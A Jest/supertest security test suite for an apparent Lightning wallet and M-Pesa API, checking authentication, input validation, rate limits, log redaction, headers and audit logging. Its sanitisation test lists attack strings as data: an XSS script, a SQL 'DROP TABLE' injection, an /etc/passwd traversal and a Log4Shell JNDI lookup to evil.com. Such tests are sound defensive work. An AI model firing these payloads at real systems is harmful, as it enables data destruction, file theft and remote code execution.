import request from 'supertest';
import { app } from '../../index';
import { logger } from '../../utils/logger';

// Mock logger
jest.mock('../../utils/logger', () => ({
  info: jest.fn(),
  error: jest.fn(),
  warn: jest.fn(),
  debug: jest.fn(),
  security: jest.fn(),
  audit: jest.fn(),
}));

describe('Security End-to-End Tests', () => {
  let authToken: string;

  beforeAll(async () => {
    // Get auth token for authenticated requests
    const authResponse = await request(app)
      .post('/api/auth/login')
      .send({
        username: 'testuser',
        password: 'testpassword',
      });
    
    authToken = authResponse.body.token;
  });

  beforeEach(() => {
    jest.clearAllMocks();
  });

  describe('Authentication & Authorization', () => {
    it('should require authentication for protected endpoints', async () => {
      const protectedEndpoints = [
        { method: 'get', path: '/api/wallet/balance/test-wallet' },
        { method: 'post', path: '/api/wallet/create' },
        { method: 'post', path: '/api/wallet/payment/send' },
        { method: 'post', path: '/api/fiat/mpesa/buy' },
      ];

      for (const endpoint of protectedEndpoints) {
        const response = await request(app)[endpoint.method](endpoint.path);
        expect(response.status).toBe(401);
      }
    });

    it('should accept valid JWT tokens', async () => {
      const response = await request(app)
        .get('/api/wallet/balance/test-wallet')
        .set('Authorization', `Bearer ${authToken}`)
        .expect(200);

      expect(response.body.success).toBe(true);
    });

    it('should reject invalid JWT tokens', async () => {
      const invalidTokens = [
        'invalid-token',
        'Bearer invalid-token',
        'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid',
        '',
      ];

      for (const token of invalidTokens) {
        const response = await request(app)
          .get('/api/wallet/balance/test-wallet')
          .set('Authorization', token);
        
        expect(response.status).toBe(401);
      }
    });

    it('should handle token expiration', async () => {
      // This would require a token that's close to expiration
      // For now, we test the error handling
      const response = await request(app)
        .get('/api/wallet/balance/test-wallet')
        .set('Authorization', 'Bearer expired-token');
      
      expect(response.status).toBe(401);
    });
  });

  describe('Input Validation & Sanitization', () => {
    it('should sanitize malicious input', async () => {
      const maliciousInputs = [
        '<script>alert("xss")</script>',
        'SELECT * FROM users; DROP TABLE users;',
        '../../../etc/passwd',
        '${jndi:ldap://evil.com/a}',
      ];

      for (const input of maliciousInputs) {
        const response = await request(app)
          .post('/api/wallet/create')
          .set('Authorization', `Bearer ${authToken}`)
          .send({
            label: input,
            mnemonic: 'test mnemonic phrase for testing purposes only',
          });

        // Should either reject or sanitize the input
        expect([400, 200]).toContain(response.status);
        
        if (response.status === 200) {
          expect(response.body.data.label).not.toContain('<script>');
          expect(response.body.data.label).not.toContain('SELECT');
        }
      }
    });

    it('should validate phone number formats', async () => {
      const invalidPhones = [
        '123',
        'not-a-phone',
        '+2547123456789', // Too long
        '25471234567', // Too short
        '254712345678a', // Contains letter
      ];

      for (const phone of invalidPhones) {
        const response = await request(app)
          .post('/api/fiat/mpesa/buy')
          .set('Authorization', `Bearer ${authToken}`)
          .send({
            phoneNumber: phone,
            amount: 1000,
            walletId: 'test-wallet-123',
          });

        expect(response.status).toBe(400);
      }
    });

    it('should validate amount ranges', async () => {
      const invalidAmounts = [
        -1000, // Negative
        0, // Zero
        1000000000000, // Too large
        'not-a-number',
        NaN,
      ];

      for (const amount of invalidAmounts) {
        const response = await request(app)
          .post('/api/wallet/invoice/new')
          .set('Authorization', `Bearer ${authToken}`)
          .send({
            walletId: 'test-wallet-123',
            amount,
            memo: 'Test invoice',
          });

        expect(response.status).toBe(400);
      }
    });
  });

  describe('Rate Limiting', () => {
    it('should enforce rate limits on sensitive endpoints', async () => {
      const sensitiveEndpoints = [
        { method: 'post', path: '/api/wallet/payment/send' },
        { method: 'post', path: '/api/fiat/mpesa/buy' },
        { method: 'post', path: '/api/wallet/airtime/buy' },
      ];

      for (const endpoint of sensitiveEndpoints) {
        // Make multiple rapid requests
        const promises = Array(20)
          .fill(null)
          .map(() => 
            request(app)[endpoint.method](endpoint.path)
              .set('Authorization', `Bearer ${authToken}`)
              .send({
                walletId: 'test-wallet-123',
                invoice: 'lnbc1000u1p3k2v5cpp5test',
                phoneNumber: '254712345678',
                amount: 1000,
              })
          );

        const responses = await Promise.allSettled(promises);
        const rateLimitedResponses = responses.filter(
          (response) => response.status === 'fulfilled' && response.value.status === 429
        );

        expect(rateLimitedResponses.length).toBeGreaterThan(0);
      }
    });

    it('should have different rate limits for different endpoints', async () => {
      // Health endpoint should have higher rate limit
      const healthPromises = Array(100)
        .fill(null)
        .map(() => request(app).get('/health/health'));

      const healthResponses = await Promise.allSettled(healthPromises);
      const healthRateLimited = healthResponses.filter(
        (response) => response.status === 'fulfilled' && response.value.status === 429
      );

      // Should have fewer rate limited responses than sensitive endpoints
      expect(healthRateLimited.length).toBeLessThan(20);
    });
  });

  describe('Data Protection', () => {
    it('should redact sensitive data in logs', async () => {
      const sensitiveData = {
        phoneNumber: '254712345678',
        mnemonic: 'test mnemonic phrase for testing purposes only',
        token: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.test',
        privateKey: 'L1aW4aubDFB7yfrasP4ZzUYzRj7FDiZQXdmUfEdT3bc3sDcDykD',
      };

      await request(app)
        .post('/api/fiat/mpesa/buy')
        .set('Authorization', `Bearer ${authToken}`)
        .send({
          ...sensitiveData,
          amount: 1000,
          walletId: 'test-wallet-123',
        });

      // Check that sensitive data is redacted in logs
      expect(logger.info).toHaveBeenCalledWith(
        expect.any(String),
        expect.objectContaining({
          phoneNumber: expect.stringMatching(/254\*\*\*\*678/),
          mnemonic: expect.stringMatching(/\[REDACTED\]/),
          token: expect.stringMatching(/\[REDACTED\]/),
          privateKey: expect.stringMatching(/\[REDACTED\]/),
        })
      );
    });

    it('should not expose sensitive data in error responses', async () => {
      const response = await request(app)
        .post('/api/wallet/create')
        .set('Authorization', `Bearer ${authToken}`)
        .send({
          label: 'Test Wallet',
          mnemonic: 'test mnemonic phrase for testing purposes only',
        });

      // Error responses should not contain sensitive data
      if (response.status >= 400) {
        expect(JSON.stringify(response.body)).not.toContain('mnemonic');
        expect(JSON.stringify(response.body)).not.toContain('private');
        expect(JSON.stringify(response.body)).not.toContain('secret');
      }
    });
  });

  describe('Security Headers', () => {
    it('should include security headers', async () => {
      const response = await request(app).get('/health/health');

      expect(response.headers['x-content-type-options']).toBe('nosniff');
      expect(response.headers['x-frame-options']).toBe('DENY');
      expect(response.headers['x-xss-protection']).toBe('1; mode=block');
      expect(response.headers['strict-transport-security']).toBeDefined();
    });

    it('should handle CORS properly', async () => {
      const response = await request(app)
        .options('/api/wallet/balance/test-wallet')
        .set('Origin', 'http://localhost:3000');

      expect(response.headers['access-control-allow-origin']).toBeDefined();
      expect(response.headers['access-control-allow-methods']).toBeDefined();
    });
  });

  describe('Audit Logging', () => {
    it('should log security events', async () => {
      // Attempt unauthorized access
      await request(app).get('/api/wallet/balance/test-wallet');

      expect(logger.warn).toHaveBeenCalledWith(
        expect.stringContaining('UNAUTHORIZED_ACCESS'),
        expect.objectContaining({
          ip: expect.any(String),
          userAgent: expect.any(String),
          endpoint: '/api/wallet/balance/test-wallet',
        })
      );
    });

    it('should log authentication events', async () => {
      // Successful login
      await request(app)
        .post('/api/auth/login')
        .send({
          username: 'testuser',
          password: 'testpassword',
        });

      expect(logger.info).toHaveBeenCalledWith(
        expect.stringContaining('AUTHENTICATION'),
        expect.objectContaining({
          success: true,
          userId: expect.any(String),
        })
      );
    });

    it('should log wallet operations', async () => {
      await request(app)
        .post('/api/wallet/create')
        .set('Authorization', `Bearer ${authToken}`)
        .send({
          label: 'Test Wallet',
          mnemonic: 'test mnemonic phrase for testing purposes only',
        });

      expect(logger.info).toHaveBeenCalledWith(
        expect.stringContaining('WALLET_OPERATION'),
        expect.objectContaining({
          success: true,
          userId: expect.any(String),
        })
      );
    });
  });
});
